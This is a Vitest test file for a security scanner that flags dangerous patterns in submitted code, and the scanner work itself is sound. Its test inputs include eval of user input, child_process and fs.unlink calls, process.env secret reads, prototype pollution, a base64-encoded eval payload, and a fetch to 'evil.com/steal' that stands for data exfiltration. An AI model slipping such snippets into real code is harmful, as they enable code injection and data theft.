/**
 * Tests for the security scanner module.
 */

import { describe, it, expect } from 'vitest';
import { scanWaveCode } from '../../../src/waves/security-scanner.js';

describe('SecurityScanner', () => {
  describe('scanWaveCode', () => {
    it('passes clean code with no dangerous patterns', () => {
      const code = `
        var execute = async function(params) {
          var response = await fetch("https://api.example.com/data");
          var data = await response.json();
          return JSON.stringify(data);
        };
      `;
      const result = scanWaveCode(code, ['api.example.com']);
      expect(result.passed).toBe(true);
      expect(result.summary.critical).toBe(0);
    });

    it('detects eval() as critical', () => {
      const code = `var execute = async function(params) { return eval(params.code); };`;
      const result = scanWaveCode(code);
      expect(result.passed).toBe(false);
      expect(result.summary.critical).toBeGreaterThan(0);
      expect(result.findings.some((f) => f.category === 'dangerous-global')).toBe(true);
    });

    it('detects new Function() as critical', () => {
      const code = `var fn = new Function("return 1");`;
      const result = scanWaveCode(code);
      expect(result.passed).toBe(false);
      expect(result.findings.some((f) => f.message.includes('new Function()'))).toBe(true);
    });

    it('detects require() as critical', () => {
      const code = `var fs = require("fs");`;
      const result = scanWaveCode(code);
      expect(result.passed).toBe(false);
      expect(result.findings.some((f) => f.category === 'module-abuse')).toBe(true);
    });

    it('detects dynamic import() as critical', () => {
      const code = `var mod = await import("dangerous-module");`;
      const result = scanWaveCode(code);
      expect(result.passed).toBe(false);
      expect(result.findings.some((f) => f.message.includes('Dynamic import()'))).toBe(true);
    });

    it('detects child_process usage as critical', () => {
      const code = `var cp = require("child_process");`;
      const result = scanWaveCode(code);
      expect(result.passed).toBe(false);
      expect(result.findings.some((f) => f.category === 'child-process')).toBe(true);
    });

    it('detects process.exit() as critical', () => {
      const code = `process.exit(1);`;
      const result = scanWaveCode(code);
      expect(result.passed).toBe(false);
      expect(result.findings.some((f) => f.message.includes('process.exit()'))).toBe(true);
    });

    it('detects process.env as high severity', () => {
      const code = `var key = process.env.API_KEY;`;
      const result = scanWaveCode(code);
      expect(result.passed).toBe(true); // high, not critical
      expect(result.summary.high).toBeGreaterThan(0);
      expect(result.findings.some((f) => f.category === 'env-access')).toBe(true);
    });

    it('detects __proto__ as high severity', () => {
      const code = `obj.__proto__ = {};`;
      const result = scanWaveCode(code);
      expect(result.summary.high).toBeGreaterThan(0);
      expect(result.findings.some((f) => f.category === 'prototype-pollution')).toBe(true);
    });

    it('detects fs.unlink as high severity', () => {
      const code = `fs.unlink("/tmp/file");`;
      const result = scanWaveCode(code);
      expect(result.summary.high).toBeGreaterThan(0);
      expect(result.findings.some((f) => f.category === 'fs-abuse')).toBe(true);
    });

    it('detects undeclared domains in fetch calls', () => {
      const code = `
        var execute = async function(params) {
          var resp = await fetch("https://evil.com/steal");
          return resp.text();
        };
      `;
      const result = scanWaveCode(code, ['api.example.com']);
      expect(result.findings.some((f) => f.category === 'undeclared-domain')).toBe(true);
    });

    it('allows fetch to declared domains', () => {
      const code = `
        var execute = async function(params) {
          var resp = await fetch("https://api.example.com/data");
          return resp.text();
        };
      `;
      const result = scanWaveCode(code, ['api.example.com']);
      expect(result.findings.some((f) => f.category === 'undeclared-domain')).toBe(false);
    });

    it('detects base64-encoded dangerous patterns', () => {
      // Need 40+ base64 chars to trigger the scanner pattern
      const dangerousPayload = 'var result = eval(userInput); return result; // padding';
      const encoded = Buffer.from(dangerousPayload).toString('base64');
      const code = `var payload = "${encoded}";`;
      const result = scanWaveCode(code);
      expect(result.findings.some((f) => f.category === 'encoded-payload')).toBe(true);
    });

    it('returns findings sorted by severity (critical first)', () => {
      const code = `
        eval("test");
        process.env.SECRET;
        console.warn("test");
      `;
      const result = scanWaveCode(code);
      const severities = result.findings.map((f) => f.severity);
      const criticalIdx = severities.indexOf('critical');
      const highIdx = severities.indexOf('high');
      const lowIdx = severities.indexOf('low');
      if (criticalIdx >= 0 && highIdx >= 0) {
        expect(criticalIdx).toBeLessThan(highIdx);
      }
      if (highIdx >= 0 && lowIdx >= 0) {
        expect(highIdx).toBeLessThan(lowIdx);
      }
    });

    it('includes line numbers in findings', () => {
      const code = `line1\nline2\neval("test");\nline4`;
      const result = scanWaveCode(code);
      const evalFinding = result.findings.find((f) => f.message.includes('eval()'));
      expect(evalFinding?.line).toBe(3);
    });

    it('returns correct summary counts', () => {
      const code = `
        eval("a");
        require("fs");
        process.env.KEY;
        console.warn("x");
      `;
      const result = scanWaveCode(code);
      expect(result.summary.critical).toBeGreaterThanOrEqual(2); // eval + require
      expect(result.summary.high).toBeGreaterThanOrEqual(1); // process.env
      expect(result.summary.low).toBeGreaterThanOrEqual(1); // console.warn
    });
  });
});
